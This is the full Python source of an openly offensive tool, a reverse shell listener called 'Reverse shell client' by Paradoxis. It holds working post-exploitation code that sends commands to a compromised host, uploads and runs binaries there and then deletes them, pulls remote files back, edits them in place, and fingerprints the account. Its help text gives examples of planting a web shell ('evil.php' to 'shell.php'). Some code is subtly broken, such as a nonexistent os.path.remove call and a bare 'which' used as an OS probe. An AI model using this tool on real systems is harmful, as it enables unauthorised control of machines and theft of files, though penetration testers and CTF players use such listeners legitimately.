#!/usr/bin/env python
# Reverse shell client 2.0.0 (https://www.paradoxis.nl/projects/reverse-shell-client)
# Copyright (c) 2014 - 2015 | Paradoxis
#
# Reverse shell client is a netcat listener alternative.
# Mostly used if you don't have access to netcat on a given system or
# when you need to perform harder tasks. Currently all special rsh commands
# excluding 'help' or 'exit' are unix based.
#
# Usage: python rsh-client.py [-p <port>, [-i <interface ip>]]
# Help: python rsh-client.py --help
#
# Examples:
#   python rsh-client.py                             | Default listener without parameters
#   python rsh-client.py -p 443                      | Specify a custom port to listen on
#   python rsh-client.py -p 443 -i 127.0.0.1         | Specify an interface address to listen on
#   python rsh-client.py -P                          | Keep the shell open when CTRL + C is pressed.
#   python rsh-client.py -H 127.0.0.1                | Only accept connections from one host
#   python rsh-client.py -H "127.0.0.1,192.168.1.66" | Only accept connections from multiple hosts
#
# @version 2.0.0
# @author  Paradoxis <luke@paradoxis.nl>
#
# @todo Add autofingerprint parameter
# @todo Add Proxy tunneling
import os
import sys
import time
import errno
import shlex
import socket
import struct
import random
from datetime import date

# Global variables
version = "2.0.0"
project_url = "https://www.paradoxis.nl/projects/reverse-shell-client"

# Display header
def header():
    print("")
    print("Reverse shell client %s (%s)" % (version, project_url))
    print("Copyright (c) 2014 - %d | Paradoxis" % (date.today().year))
    print("")

# Display usage
# @return void
def usage():
    header()
    print("Usage: python rsh-client.py [-p <port>, [-i <interface ip>]]                                          ")
    print("  -h --help <void>        | Shows the help screen. (You're looking at it!)                            ")
    print("  -p --port <int>         | Specify port to listen on, listens on a random port if not specified.     ")
    print("  -i --interface <string> | Specify interface address to listen on, listens on all if not specified.  ")
    print("  -P --persistent <void>  | Specify that the shell should remain open on CTRL + C, closes by default. ")
    print("  -A --allow <string>     | Specify hosts to accept connections from, comma seperated, all by default.")
    print("")
    sys.exit()

# Main method
# Parse arguments
# Listen on a socket for connections
# @return void
def main():

    # Parameters
    port = 0
    interface = ""
    persistent = False
    hosts = None

    # Socket object
    sock = None

    # Get parameters
    if "-h" in sys.argv or "--help" in sys.argv:
        usage()
    if "-p" in sys.argv:
        port = int(sys.argv[sys.argv.index('-p') + 1])
    if "--port" in sys.argv:
        port = int(sys.argv[sys.argv.index('--port') + 1])
    if "-i" in sys.argv:
        interface = sys.argv[sys.argv.index('-i') + 1]
    if "--interface" in sys.argv:
        interface = sys.argv[sys.argv.index('--interface') + 1]
    if "-P" in sys.argv or "--persistent" in sys.argv:
        persistent = True
    if "-H" in sys.argv:
        hosts = sys.argv[sys.argv.index('-H') + 1]
    if "--hosts" in sys.argv:
        hosts = sys.argv[sys.argv.index('--hosts') + 1]

    # Turn hosts into an array
    if hosts:
        hosts = hosts.split(",")

    # Initialize a new socket and listen for a connection
    # Upon connection, create an interactive shell
    # Close the sockets once the shell is closed
    try:
        header()
        sock = Socket(port, interface)
        sock.listen(hosts)
        shell = Shell(sock, persistent)
        shell.interact()
        sock.close()
    except KeyboardInterrupt:
        sock.close()

# Prompt yes/no function
# @param string message
# @return bool
def prompt(message):
    answer = ""
    while(answer != "Y" and answer != "N"):
        answer = raw_input(message + " (Y/N): ")
        answer = answer.upper()
    return answer == "Y"


    
# Socket extension class
# Allows easy access to sockets for commands 
class Socket:

    # Global class variables
    sock = None
    conn = None
    addr = None
    port = None
    interface = None

    # Socket constructor
    # Sets up a new socket on a given port and interface
    # @param int port
    # @param string interface
    # @return void
    def __init__(self, port = 0, interface = ""):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((interface, int(port)))
        except socket.timeout:
            print("[!] Error: Connection timed out")
            self.close()
        except socket.error, err:
            print("[!] Error: Connection lost")
            print(err)
            self.close()
    
    # Listen on the given interface and port given in the constructor
    # Automatically accepts every connection and lets the program continue
    # @return void
    def listen(self, hosts = None):
        try:
            self.sock.listen(1)
            self.interface = self.sock.getsockname()[0]
            self.port = self.sock.getsockname()[1]
            if self.interface == "0.0.0.0":
                print("[+] Listening on <%s:%d>" % ("all-interfaces", self.port))
            else:
                print("[+] Listening on <%s:%d>" % (self.interface, self.port))

            self.conn, self.addr = self.sock.accept()
            self.conn.setblocking(0)
            print("[+] Got connection from <%s:%d>" % (self.addr[0], self.addr[1]))

            if hosts and self.addr[0] not in hosts:
                print("[-] Disconnecting host %s, not in hosts whitelist." % self.addr[0])
                print("")
                self.conn.shutdown(socket.SHUT_RDWR)
                self.listen(hosts)
        except socket.timeout:
            print("[!] Error: Connection timed out")
            self.close()
        except socket.error, err:
            print("[!] Error: Connection lost")
            print(err)
            self.close()

    # Send a socket message
    # Messages get sent in chunks of 2048 bytes
    # To change this, set the chunksize parameter
    # @param string message
    # @param int chunksize
    # @return void
    def send(self, message, chunksize = 2048):
        for chunk in self._chunks(message, chunksize):
            self.conn.send(chunk)
        time.sleep(0.1)

    # Receive a socket string
    # Messages get received in chunks of 2048 bytes
    # To change this, set the chunksize parameter
    # @param bool print_output
    # @param int chunksize
    # @return string
    def receive(self, print_output = False, chunksize = 2048):

        # Define global variables
        output = ""

        # Receive socket data
        try:
            while True:
                data = self.conn.recv(chunksize)
                output += data
                if print_output == True: sys.stdout.write(str(data))
                if not data: break
        except socket.timeout:
            print("[!] Error: Connection timed out")
            self.close()
        except socket.error, e:
            err = e.args[0]
            if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
                return output
            else:
                print("[!] Error: Connection lost")
                self.close()

    # Try to close the current conenction
    # Ignores any errors for when the conenction is already closed
    # @return void
    def close(self, exit = True):
        try:
            self.sock.close()
            if exit: sys.exit()
        except socket.error, e:
            print("[!] Error: " + str(e))

    # Helper function to break a string into x chunks
    # @return list
    def _chunks(self, lst, chunksize):
        for i in xrange(0, len(lst), chunksize):
            yield lst[i:i+chunksize]



# Interactive shell client
# Core features of this script reside here
class Shell:

    # global variables
    rsh = None
    sock = None
    persistent = None
    quit = False
    last_output = ""
    last_input = ""
    shell_prompt = ""
    prompts = ["> ", "% ", "$ ", "# "]

    # Shell constructor
    # Creates the interactive shell loop which keeps the sockets alive
    # @param Socket sock
    # @param bool persistent
    def __init__(self, sock, persistent = False):
        self.sock = sock
        self.rsh = RSH(sock)
        self.persistent = persistent

    # Check if shell has prompt
    # @return bool
    def _has_prompt(self):
        return self.shell_prompt != "" and any(self.shell_prompt in s for s in Shell.prompts)

    # Get the shell prompt
    # @return string
    def _get_prompt(self):
        if self._has_prompt():
            return self.shell_prompt
        else:
            return "> "

    # Print the shell prompt
    # Buggy due to bad validation
    # @todo Fix double shell prompts from being printed 
    # @return void
    def _print_prompt(self):
        sys.stdout.write(self._get_prompt())

    # Create the infinite loop in which the shell will reside
    # Shell is closed upon "rsh exit" or ^C if enabled
    # @return void
    def interact(self):
        time.sleep(0.1)
        print("                           ")
        print("[?] Help command: rsh help ")
        print("[?] Exit command: rsh exit ")
        print("[+] Happy hacking!         ")
        while True:
            self.output()
            self.input()
            if self.quit:
                print("[+] Closing shell..")
                break

    # Get shell output
    # Filters out common errors such as the command appearing in the first line
    # Of a bash reverse shell, additionally it adds a neat little shell prompt if none was found
    # @return void
    def output(self):
        self.last_output = self.sock.receive(True)
        if self.last_output != None and self.last_output != "" and self._has_prompt() == False:
            self.shell_prompt = self.last_output[-2:]

    # Get shell input
    # @return void
    def input(self):

        # Fetch command
        try:
            if (self._has_prompt()):
                command = raw_input("")
            else:
                command = raw_input(self._get_prompt())

            # Check if the command is a RSH command
            if command.startswith("rsh"):
                if command == "rsh exit":
                    self.quit = True
                    return
                else:
                    self.rsh.shell_dispatch(command)
                    if self._has_prompt(): self._print_prompt()
                    return

            # Escape command
            if command.startswith("\\rsh"):
                command = command[1:]

            # Send the command the the active socket
            self.sock.send(command + "\n")

        # Catch ^C input and handle it
        except KeyboardInterrupt:
            if self.persistent:
                self.sock.send(struct.pack('B', int("0x03", 16)))
            else:
                self.quit = True
                print("")



# Custom shell commands
# Adds extra functionality to the default shell
# This includes transferring files and fingerprinting the system
class RSH:

    # Socket
    sock = None

    # RSH constrcutor
    # Initialize sockets etc
    # @param Socket sock
    # @return void
    def __init__(self, sock):
        self.sock = sock

    # Dispatch a command from the shell
    # Analyzes the command and executes it
    # Shows an error if the command doesn't exist
    # Shows the help if the command is filled in incorrectly
    # @param string command
    # @return void
    def shell_dispatch(self, command):

        # Split command arguments
        argv = shlex.split(command)

        # Invalid number of parameters, pass to help.
        if len(argv) < 2:
            self.help()
            return

        # Help command
        if len(argv) > 1 and argv[1] == "help":
            if len(argv) > 2:
                self.help(argv[2])
                return
            else:
                self.help()
                return

        # Upload command
        if len(argv) > 1 and argv[1] == "upload":
            if len(argv) > 2:
                if len(argv) > 3:
                    self.upload(argv[2], argv[3])
                    return
                else:
                    self.upload(argv[2])
                    return
            else:
                self.help("upload")
                return

        # Download command
        if len(argv) > 1 and argv[1] == "download":
            if len(argv) > 2:
                if len(argv) > 3:
                    self.download(argv[2], argv[3])
                    return
                else:
                    self.download(argv[2])
                    return
            else:
                self.help("download")
                return

        # Edit command
        if len(argv) > 1 and argv[1] == "edit":
            if len(argv) > 2:
                self.edit(argv[2])
                return
            else:
                self.help(argv[1])
                return

        # Execute command
        if len(argv) > 1 and (argv[1] == "execute" or argv[1] == "exec"):
            if len(argv) > 2:
                if len(argv) > 3:
                    self.execute(argv[2], ' '.join(argv[3:]))
                else:
                    self.execute(argv[2])
                return
            else:
                self.help(argv[1])
                return

        # Fingerprint command
        if len(argv) > 1 and argv[1] == "fingerprint":
            self.fingerprint()
            return

        # Unknown command
        print("[!] Error: Unknown command '%s'" % command)

    # Help with RSH commands
    # @param string command
    # @return void
    def help(self, command = None):

        # Exit command
        if command != None:
            if command == "exit":
                print("")
                print("Usage: rsh exit                                                                               ")
                print("  Exits the current shell by closing the socket.                                              ")
                print("  By default, 'rsh exit' is executed when ^C (ctrl + c) is pressed.                           ")
                print("  This feature can be disabled by using the -P or --persistent parameter when running the     ")
                print("  program.                                                                                    ")
                print("")

            # Upload command
            if command == "upload":
                print("")
                print("Usage: rsh upload <localfile> [<remotefile>]                                                  ")
                print("  Upload a file to the remote shell, this is done by reading the local file and echoing       ")
                print("  the contents into the remote file. The script checks if your shell has permission to write  ")
                print("  to the specified location. If not, your shell will be prompted to upload to /tmp/.. or quit ")
                print("  the current upload. If no remotefile is specified it will try to echo the file in the       ")
                print("  current working directory. If the file exists, your shell will be prompted to overwrite the ")
                print("  remote file.                                                                                ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh upload /root/evil.php                     | Uploads a file to /tmp/12345-evil.php       ")
                print("  rsh upload /root/evil.php /home/www/shell.php | Uploads a file to /home/www/shell.php       ")
                print("")

            # Download command
            elif command == "download":
                print("")
                print("Usage: rsh download <remotefile> [<localfile>]                                                ")
                print("  Download a file from the remote shell to a local file. This is done by echoing the file,    ")
                print("  and writing the output to a local file. The script checks for permission read the file from ")
                print("  the remote shell before reading it. The script will quit if permission is denied. If no     ")
                print("  localfile parameter is passed through, the script will save the file in a randomized        ")
                print("  filename in the /tmp/ directory.                                                            ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh download /home/www/index.php                 | Downloads a file to /tmp/12345-index.php ")
                print("  rsh download /home/www/index.php /root/owned.php | Downloads a file to /root/owned.php      ")
                print("")


            # Execute or exec command
            elif command == "execute" or command == "exec":
                print("")
                print("Usage: rsh execute <localfile> [<params>]                                                     ")
                print("  Upload an execute a binary file or script to the remote shell and removes the script after  ")
                print("  execution. Parameters will be added to the file execution. See 'rsh help upload' and        ")
                print("  'rsh help download' for more information about file transfers.                              ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh execute /root/somebinary      | Uploads a binary and executes it                        ")
                print("  rsh execute /root/somebinary -abc | Uploads a binary and executes it with parameters        ")
                print("")

            # Edit command
            elif command == "edit":
                print("")
                print("Usage: rsh edit <remotefile> [-f | --force]                                                   ")
                print("  Download, edit and re-upload a text based file on the remote shell. The script will first   ")
                print("  detect if the file has rights to read and write the files. If the local file after editing  ")
                print("  has not changed, no file will be re-uploaded. Use the -f or --force parameter to force the  ")
                print("  script to re-upload the file.                                                               ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh edit /home/www/index.php    | Edit a file from the remote server                        ")
                print("  rsh edit /home/www/index.php -f | Force a re-write after editing a file                     ")
                print("")

            # Fingerprint command
            elif command == "fingerprint":
                print("")
                print("Usage: rsh fingerprint                                                                        ")
                print("  Fingerprint the remote shell by executing a list of commands. This is to check permissions  ")
                print("  type of server running etc.                                                                 ")
                print("                                                                                              ")
                print("Examples:                                                                                     ")
                print("  rsh fingerprint | Fingerprints the remote shell                                             ")
                print("")
            else:
                print("[!] Unknown command %s, type 'rsh help' for a list of all commands                            ")

        # All commands
        else:
            print("")
            print("Usage: rsh <command> [<parameter> [<parameter> ..]]                                               ")
            print("  rsh exit                                   | Exit the current shell session                     ")
            print("  rsh help [<command>]                       | Print detailed information about an RSH command    ")
            print("  rsh upload <localfile> [<remotefile>] [-f] | Upload a file to the remote shell                  ")
            print("  rsh download <remotefile> [<localfile>]    | Download a file from the remote shell              ")
            print("  rsh execute <localfile> [<params>]         | Upload and execute a file on the remote shell      ")
            print("  rsh exec <localfile> [<params>]            | Shorthand for execute                              ")
            print("  rsh edit <remotefile> [-f]                 | Edit a text based file on the remote shell         ")
            print("  rsh fingerprint                            | Fingerprint the remote shell system                ")
            print("")

    # Helper function to make a key
    # @return int
    def _generate_key(self):
        return random.randrange(15000, 9999999999)

    # Helper function to make a temp filename
    # @param string filename
    # @return string
    def _generate_tmpname(self, filename):
        return "/tmp/%d-%s" % (self._generate_key(), filename.split('/')[-1])

    # RWX validation
    # @see 'help test' in linux
    # @param string operator
    # @param string remotefile
    # @return bool
    def validate_permissions(self, operator, remotefile):
        key = self._generate_key()
        self.sock.send("[ -%s %s ] && echo %d\n" % (operator, remotefile, key))
        output = self.sock.receive(False)
        return str(key) in output or "--debug" in sys.argv

    # Check if a file or direcotry is readable
    # @param string remotefile
    # @return bool
    def is_readable(self, remotefile):
        return self.validate_permissions('r', remotefile)

    # Check if a file or directory is writable
    # @param string remotefile
    # @return bool
    def is_writable(self, remotefile):
        return self.validate_permissions('w', remotefile)

    # Check if a file or directory is writable
    # @param string remotefile
    # @return bool
    def is_executable(self, remotefile):
        return self.validate_permissions('x', remotefile)

    # Check if a file exists
    # @param string remotefile
    # @return bool
    def file_exists(self, remotefile):
        return self.validate_permissions('e', remotefile)

    # Upload a file to the remote shell
    # @param string localfile
    # @param string remotefile
    # @return bool
    def upload(self, localfile, remotefile = None):

        # Get remote filename
        if remotefile == None:
            remotefile = "$(pwd)/" + localfile.split('/')[-1]
            remotedir = "$(pwd)/"
        else:
            remotedir = remotefile.rsplit('/', 1)[0]

        # Check if local file exists
        if not os.path.isfile(localfile):
            print("[!] Error: File %s not found!" % localfile)
            return False

        # Check for permissions
        print("[+] Checking %s for write permissions.." % remotedir.replace("$(pwd)/", ""))
        if self.is_writable(remotedir):
            if self.file_exists(remotefile) and self.is_writable(remotefile):
                if not prompt("[?] Remote file %s exists, overwrite?" % remotefile.replace("$(pwd)/", "")):
                    print("[-] Aborted file upload.")
                    return False

            print("[+] Uploading %s.." % localfile)

            # Create or empty file
            self.sock.send("/bin/echo -n '' > %s\n" % remotefile)
            self.sock.receive()

            file = open(localfile, 'r')
            while True:
                chunk = file.read(1024)
                if not chunk: break
                self.sock.send("/bin/echo -en %s >> %s\n" % (repr(chunk), remotefile))
                self.sock.receive()
            file.close()

            # Uploaded successfully
            print("[+] Successfully uploaded file to %s!" % remotefile.replace("$(pwd)/", ""))
            return True
        else:
            if prompt("[?] Permission denied, write to /tmp instead?"):
                return self.upload(localfile, self._generate_tmpname(localfile))
            else:
                print("[-] Aborted file upload.")
                return False

    # Download a file from the remote shell
    # @param string remotefile
    # @param string localfile
    # @return void|string
    def download(self, remotefile, localfile = None):

        # Generate a download name
        if localfile == None:
            localfile = self._generate_tmpname(remotefile)

        # Check if file exists on remote server
        print("[+] Checking if %s exists.." % remotefile)
        if not self.file_exists(remotefile):
            print("[!] Error: File does not exist")
            return

        # Check permissions
        print("[+] Checking %s for read permissions.." % remotefile)
        if not self.is_readable(remotefile):
            print("[!] Error: Permission denied")
            return

        # Download file
        try:
            print("[+] Downloading %s.." % (remotefile))
            self.sock.send("cat %s\n" % remotefile)
            file = open(localfile, 'w')
            file.write(self.sock.receive())
            file.close()
            print("[+] Successfully downloaded file to %s!" % localfile)
            return localfile
        except Exception, err:
            print("[!] Error: %s" % err)

    # Upload and execute a local file to the remote shell
    # @param string localfile
    # @param string params
    # @return void|string
    def execute(self, localfile, params = ""):

        # Upload file
        remotefile = self._generate_tmpname(localfile)
        if not self.upload(localfile, remotefile):
            print("[!] Failed to execute %s on remote server" % localfile)
            return

        # Allow execution
        self.sock.send("chmod +x %s\n" % remotefile)
        self.sock.receive()

        # Execute binary
        print("[+] Executing: %s %s" % (remotefile, params))
        self.sock.send("%s %s\n" % (remotefile, params))
        out = self.sock.receive(True)
        if out: print("")

        # Remove binary from remote shell
        print("[+] Removing %s.." % remotefile)
        self.sock.send("rm -f %s\n" % remotefile)
        self.sock.receive()
        return remotefile

    # Download, edit and re-upload a file from and to the remote shell
    # This is due to the fact that nano and vim are (REALLY) buggy in 
    # Reverse shells.
    # @param string remotefile
    # @return bool|void
    def edit(self, remotefile):

        # Download the file
        localfile = self.download(remotefile, self._generate_tmpname(remotefile))
        if not localfile:
            print("[!] Failed to open %s for editing." % remotefile)
            return

        # Determine the current editor and open it
        # @todo implement this
        if self.upload(localfile, remotefile):
            print("[+] Successfully edited %s!" % remotefile)
            os.path.remove(localfile)
            return True
        else:
            print("[!] Failed to edit %s." % remotefile)
            return 

    # Fingerprint the remote shell
    # Simply a tool that helps the user in finding out more about the system
    # @return Bool
    def fingerprint(self):
        self.sock.send("id\n")
        print("[+] ID level: %s" % self.sock.receive())
        self.sock.send("which\n")
        print("[+] Operating system: %s" % self.sock.receive())

# Call main 
if __name__ == "__main__":
    main()